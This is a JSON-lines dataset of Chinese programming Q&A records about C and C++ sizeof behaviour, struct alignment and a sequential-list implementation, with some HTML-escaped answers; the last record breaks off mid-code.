{"Answer": "char *p[]   = {\"PAUL\", \"X\", \"MAC\"};这句话是声明了一个指针变量的数组，p[0]，p[1]，p[2]在这里都是指针变量，而指针变量都是占4个字节的内存。你\r\n说的p[0]所占用的字节是4，p[1]所占用的字节是1，这是指针变量指向的内存地址存储的数据的占用内存。不明白，先去百度下，指针和变量的区别吧。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言遇到问题，请大神相助！指针型数组里元素所占用字节问题！", [" #include <stdio.h>\n\nint main(void)\n{\n    int  i;\n    char a[][5] = {\"LISP\", \"C\", \"Ada\"};\n    char *p[]   = {\"PAUL\", \"X\", \"MAC\"};\n\n    for (i = 0; i < 3; i++)\n        printf(\"a[%d] = \\\"%s\\\"\\n\", i, a[i]);\n\n    for (i = 0; i < 3; i++){\n        printf(\"p[%d] = \\\"%s\\\"\\n\", i, p[i]);\n        printf(\"p[%d]占用%d字节\\n\", i, sizeof(p[i]));\n\n    };\n    printf(\"p占用%d字节\\n\", sizeof(p));\n\n    return 0;\n}\n", "\n\n", "代码如上，我理解p[0]所占用的字节是4，p[1]所占用的字节是1，p[2]所占用的字节是3.", "\n\n", "但是，实际情况是这样的，如下图所示", "\n\n", "\n\n", "想请问高手，这是为什么？谢谢！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;struct SIMPLE里面类型的大小是&amp;#xff0c;4&amp;#xff0c;1&amp;#xff0c;8&amp;#xff0c;对其大小为8&amp;#xff08;一般为最大的&amp;#xff09;&amp;#xff0c;结构体大小为最大的倍数。按顺序放4&amp;#xff0c;1放一个8字节&amp;#xff0c;8单独一个8字节。&lt;br /&gt;struct COMPLEX里面类型的大小是&amp;#xff0c;100个1&amp;#xff0c;4&amp;#xff0c;1&amp;#xff0c;8&amp;#xff0c;对其大小为8&amp;#xff08;一般为最大的&amp;#xff09;&amp;#xff0c;结构体大小为最大的倍数。按顺序放前96个1&amp;#xff0c;放到12个8里面&amp;#xff0c;接下来两个1和一个四放到一个8里&amp;#xff0c;接下来的1&amp;#xff0c;放到一个8里&amp;#xff0c;最后一个8放到一个8里。15个&amp;#xff0c;120。关于第二个8&amp;#xff0c;因为它们还要遵守&amp;#xff0c;放到位置的相对地址是自己大小的整倍数处&amp;#xff0c;所以那个4只能放到他那个8的后半部分&amp;#xff0c;而不能紧挨着那两个1放。同理&amp;#xff0c;最后一个8单独占一个8。&lt;/p&gt;\n&lt;p&gt;同理&amp;#xff0c;最后一个&amp;#xff0c;你应该实在x64位系统下运行的&amp;#xff0c;所以是那个指针大小是8&amp;#xff08;x86是4&amp;#xff09;&amp;#xff0c;最大所以是&amp;#xff0c;96&amp;#xff08;96*1&amp;#xff09;&amp;#xff0c;8&amp;#xff08;4*1&amp;#xff09;,8&amp;#xff08;8&amp;#xff09; &amp;#61; 112&amp;#xff1b;x86下是104&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言结构类型变量所占有的内存空间问题，按照所有类型的内存空间相加，下面的应该是13，113吧，还有一个难以计算？", ["#", "include", " ", "<stdio.h>", "\n", "struct", " ", "SIMPLE", "\n{\n    ", "int", " a;\n    ", "char", " b;\n    ", "double", " c;\n} simple;\n", "//此结构体的声明包含了其他的结构体", "\n", "struct", " ", "COMPLEX", "\n{\n    ", "char", " string[", "100", "];\n    ", "struct", " ", "SIMPLE", " a;\n} complex;\n/此结构体的声明包含了指向自己类型的指针\n", "struct", " ", "NODE", "\n{\n    ", "char", " string[", "100", "];\n    ", "struct", " ", "NODE", " *next_node;\n}node;\n", "int", " ", "main", "()", "\n", "{\n\n ", "printf", "( ", "\"Memory size occupied by a: %d\\n\"", ", ", "sizeof", "(a));\n ", "printf", "( ", "\"Memory size occupied by complex: %d\\n\"", ", ", "sizeof", "(a));\n", "printf", "( ", "\"Memory size occupied by node: %d\\n\"", ", ", "sizeof", "(node));\n\n}\n", "\n", "为什么结果显示a是16，complex是120，node是112？"]], "Tag": "程序设计"}
{"Answer": "```\r\n//你可以：\r\nstr1[j].size()\r\n//也可以：\r\nstr1[j].length()；\r\n//还可以：\r\nstrlen(str1[j].c_str());\r\n\r\n//但不能\r\nsizeof(str1[j])；\r\n//这跟\r\nsizeof(string)；\r\n\r\nchar *p;\r\nsizeof(p)；\r\n//一个意思\r\n\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["问一下各位为什么sizeof（str1[j]）会恒定为8呢（我很确定我的文件中没有一行长度是8）难道是我的str没有得到完整的每行的文件内容？", ["#include <iostream>\n#include <string>\n#include <fstream>\nusing namespace std;\n\nint main(){\n    ifstream inf(\"DATA5613.TXT\");\n    ifstream infile(\"DATA5613.CPP\");\n    string str1[10],str2[10];\n    int j,k,i=0;\n    for(i=0;;i++){\n        getline(inf,str1[i]);\n        getline(infile,str2[i]);\n        if(!str1[i].size()) break;\n    }\n    for(j=0;j<i;j++){\n        for(k=0;k<sizeof(str1[j]);k++){\n        //通过调试我发现sizeof(str1[j])的值恒为8\n            if(str1[j][k]!=str2[j][k]) \n            cout<<j+1<<\" \"<<k+1<<endl;\n        }\n    }\n    inf.close();\n    infile.close();\n    return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;至于d&amp;#xff0c;我在vs上测试了&amp;#xff0c;是没有问题得&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/198384530646157.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/201170530646113.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C里面的sizeof（sin（1））怎么解释，D错在哪里了", ["问题遇到的现象和发生背景", "\n", "问题相关代码，请勿粘贴截图", "\n", "运行结果及报错内容", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;原代码第132行&amp;#xff0c;if()里少了一个 ‘&amp;#61; ’号&amp;#xff0c;其他处修改如下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; overflow -1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; ok 1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;error&lt;/span&gt; 0&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; maxsize 16&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; increment 10&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; status;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; elemtype;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt;\n{\n    elemtype *elem;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; length;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; listsize;\n} sqlist;\n&lt;span class=\"hljs-comment\"&gt;//初始化&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;initlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L)&lt;/span&gt;\n&lt;/span&gt;{\n    L.elem &amp;#61; (elemtype *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(maxsize * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!L.elem)\n        &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(overflow);\n    L.length &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    L.listsize &amp;#61; maxsize;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n&lt;span class=\"hljs-comment\"&gt;//创建&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;sqlist &lt;span class=\"hljs-title\"&gt;creata_list&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist L)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,N;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;input length you want --&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;N);\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;( i!&amp;#61; N )\n    {\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;L.elem[i]);\n        i&amp;#43;&amp;#43;;\n    }\n    L.length &amp;#43;&amp;#61; N;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; L;\n}\n&lt;span class=\"hljs-comment\"&gt;//在指定位置插入数字 &lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;insertlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i, elemtype e)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (i &amp;lt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; || i &amp;gt; L.length)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    elemtype *p;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (L.length &amp;gt;&amp;#61; L.listsize)\n    {\n        p &amp;#61; (elemtype *)&lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;(L.elem, (L.listsize &amp;#43; increment) * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype));\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!p)\n            &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(overflow);\n        L.elem &amp;#61; p;\n        L.listsize &amp;#43;&amp;#61; increment;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; L.length - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; j &amp;gt;&amp;#61; i - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; --j)\n        L.elem[j &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; L.elem[j];\n    L.elem[j &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; e;\n    L.length&amp;#43;&amp;#43;;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n&lt;span class=\"hljs-comment\"&gt;//输出顺序表 &lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist L)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; L.length; i&amp;#43;&amp;#43;)\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, L.elem[i]);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n}\n&lt;span class=\"hljs-comment\"&gt;//删除相应位置数据 &lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;status &lt;span class=\"hljs-title\"&gt;dellist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i, elemtype &amp;amp;e)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (i &amp;lt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; || i &amp;gt; L.length)\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    e &amp;#61; L.elem[i - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;];\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; i; j &amp;lt; L.length; j&amp;#43;&amp;#43;)\n        L.elem[j - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; L.elem[j];\n    --L.length;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ok;\n}\n&lt;span class=\"hljs-comment\"&gt;//获取相应位置数据 &lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;LocatedList&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist &amp;amp;L,&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(j&amp;lt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; || j&amp;gt;L.length){\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;The specified location does not exist!&amp;#34;&lt;/span&gt;);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; L.elem[j&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;] ;   &lt;span class=\"hljs-comment\"&gt;//直接返回 &lt;/span&gt;\n }\n&lt;span class=\"hljs-comment\"&gt;//获取相关值的位置&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;GetList&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist L,elemtype temp)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;( j&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; ; j&amp;lt;L.length ; j&amp;#43;&amp;#43;){\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(L.elem[j]&amp;#61;&amp;#61;temp)  {\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; j;\n    &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n}\n}\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;dont exist!\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n } \n&lt;span class=\"hljs-comment\"&gt;//合并集合 &lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;sqlist &lt;span class=\"hljs-title\"&gt;MergeList&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist La,sqlist Lb,sqlist *Lc)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; cnt&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;  &lt;span class=\"hljs-comment\"&gt;//修改&lt;/span&gt;\n    Lc-&amp;gt;length&amp;#61;La.length&amp;#43;Lb.length;\n    &lt;span class=\"hljs-comment\"&gt;//Lc-&amp;gt;listsize&amp;#61;Lc-&amp;gt;length;  //修改&lt;/span&gt;\n    elemtype *pa&amp;#61;La.elem,*pb&amp;#61;Lb.elem,*pc;\n    pc&amp;#61;(elemtype*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(Lc-&amp;gt;length*&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype)); &lt;span class=\"hljs-comment\"&gt;//申请新的内存&lt;/span&gt;\n    Lc-&amp;gt;elem&amp;#61;pc;\n    elemtype *pa_last,*pb_last;     &lt;span class=\"hljs-comment\"&gt;//定义指向初地址和末地址的指针&lt;/span&gt;\n    pa_last&amp;#61;La.elem&amp;#43;La.length&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;;\n    pb_last&amp;#61;Lb.elem&amp;#43;Lb.length&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;((pa &amp;lt;&amp;#61; pa_last)&amp;amp;&amp;amp;(pb&amp;lt;&amp;#61;pb_last)){\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(*pa &amp;lt; *pb) *pc&amp;#43;&amp;#43; &amp;#61; *pa&amp;#43;&amp;#43;;\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(*pa &amp;gt; *pb) *pc&amp;#43;&amp;#43; &amp;#61; *pb&amp;#43;&amp;#43;;\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(*pa &amp;#61;&amp;#61; *pb) { *pc&amp;#43;&amp;#43; &amp;#61; *pa&amp;#43;&amp;#43;; *pb&amp;#43;&amp;#43;;cnt&amp;#43;&amp;#43;;}&lt;span class=\"hljs-comment\"&gt;//顺序存储&amp;#xff0c;重复只存pa&amp;#xff0c;pa&amp;#xff0c;pb都后退&lt;/span&gt;\n    }            &lt;span class=\"hljs-comment\"&gt;//修改 &amp;#61;&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(pa &amp;lt;&amp;#61; pa_last) *pc&amp;#43;&amp;#43; &amp;#61; *pa&amp;#43;&amp;#43;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(pb &amp;lt;&amp;#61; pb_last) *pc&amp;#43;&amp;#43; &amp;#61; *pb&amp;#43;&amp;#43;; &lt;span class=\"hljs-comment\"&gt;//判空&amp;#xff0c;不为空继续赋值&amp;#xff0c;直到指向最后指针。&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(cnt--) Lc-&amp;gt;length--;  &lt;span class=\"hljs-comment\"&gt;//修改&lt;/span&gt;\n    Lc-&amp;gt;listsize&amp;#61;Lc-&amp;gt;length;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; *Lc;\n}\n&lt;span class=\"hljs-comment\"&gt;//合并顺序表&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;sqlist &lt;span class=\"hljs-title\"&gt;CombineList&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(sqlist L1,sqlist L2,sqlist *L3)&lt;/span&gt;\n&lt;/span&gt;{\n    L3-&amp;gt;length&amp;#61;L1.length&amp;#43;L2.length;\n    L3-&amp;gt;listsize&amp;#61;L3-&amp;gt;length;\n    elemtype *p1&amp;#61;L1.elem,*p2&amp;#61;L2.elem,*p3;\n    p3&amp;#61;(elemtype*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(L3-&amp;gt;length*&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(elemtype)); &lt;span class=\"hljs-comment\"&gt;//申请新的内存&lt;/span&gt;\n    L3-&amp;gt;elem&amp;#61;p3; \n    elemtype *p1_last,*p2_last;     &lt;span class=\"hljs-comment\"&gt;//定义指向初地址和末地址的指针&lt;/span&gt;\n    p1_last&amp;#61;L1.elem&amp;#43;L1.length&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;;\n    p2_last&amp;#61;L2.elem&amp;#43;L2.length&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p1 &amp;lt;&amp;#61; p1_last &amp;amp;&amp;amp; p2 &amp;lt;&amp;#61; p2_last) {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;( *p1&amp;lt;&amp;#61;*p2 ) *p3&amp;#43;&amp;#43; &amp;#61; *p1&amp;#43;&amp;#43;;\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; *p3&amp;#43;&amp;#43; &amp;#61; *p2&amp;#43;&amp;#43;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(p1 &amp;lt;&amp;#61; p1_last) *p3&amp;#43;&amp;#43; &amp;#61; *p1&amp;#43;&amp;#43;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(p2 &amp;lt;&amp;#61; p2_last) *p3&amp;#43;&amp;#43; &amp;#61; *p2&amp;#43;&amp;#43;;&lt;span class=\"hljs-comment\"&gt;//判空&amp;#xff0c;不为空继续赋值&amp;#xff0c;直到指向最后指针。&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; *L3;\n } \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    sqlist LL;\n    elemtype x,data;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; r, i,j;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!&lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(LL)) &lt;span class=\"hljs-comment\"&gt;//初始化&lt;/span&gt;\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; error;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;input data--&amp;gt;\\n&amp;#34;&lt;/span&gt;);       &lt;span class=\"hljs-comment\"&gt;//创建 &lt;/span&gt;\n    LL&amp;#61;&lt;span class=\"hljs-built_in\"&gt;creata_list&lt;/span&gt;(LL);\n    \n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;check Order table--&amp;gt;\\n&amp;#34;&lt;/span&gt;);       &lt;span class=\"hljs-comment\"&gt;//显示 &lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(LL);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;value index--&amp;gt;\\n&amp;#34;&lt;/span&gt;);  &lt;span class=\"hljs-comment\"&gt;//插入&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d %d&amp;#34;&lt;/span&gt;, &amp;amp;x, &amp;amp;r);\n    &lt;span class=\"hljs-built_in\"&gt;insertlist&lt;/span&gt;(LL, r, x);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(LL);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;index--&amp;gt;\\n&amp;#34;&lt;/span&gt;);  &lt;span class=\"hljs-comment\"&gt;//删除&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;r);\n    &lt;span class=\"hljs-built_in\"&gt;dellist&lt;/span&gt;(LL,r,x);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(LL);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;input locate--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;j);\n    data&amp;#61;&lt;span class=\"hljs-built_in\"&gt;LocatedList&lt;/span&gt;(LL,j);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;the elem[%d] &amp;#61; %d\\n&amp;#34;&lt;/span&gt;,j,data);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;input value--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    elemtype temp,place;\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&amp;amp;temp);\n    place&amp;#61;&lt;span class=\"hljs-built_in\"&gt;GetList&lt;/span&gt;(LL, temp);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#61; the elem[%d]\\n&amp;#34;&lt;/span&gt;,temp,place&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;);\n\n\n    sqlist La,Lb,Lc;                    &lt;span class=\"hljs-comment\"&gt;//合并集合 &lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Create list La--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(La);\n    La&amp;#61;&lt;span class=\"hljs-built_in\"&gt;creata_list&lt;/span&gt;(La);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;check La\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(La);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Create list Lb--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(Lb);\n    Lb&amp;#61;&lt;span class=\"hljs-built_in\"&gt;creata_list&lt;/span&gt;(Lb);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;check Lb\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(Lb);\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;combine list--&amp;gt;\\n&amp;#34;&lt;/span&gt;);\n                             &lt;span class=\"hljs-comment\"&gt;//MergeList(La,Lb,&amp;amp;Lc);&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;CombineList&lt;/span&gt;(La,Lb,&amp;amp;Lc);  &lt;span class=\"hljs-comment\"&gt;//修改&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printlist&lt;/span&gt;(Lc);\n\n    sqlist L1,L2,L3;                    &lt;span class=\"hljs-comment\"&gt;//合并有序表&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span 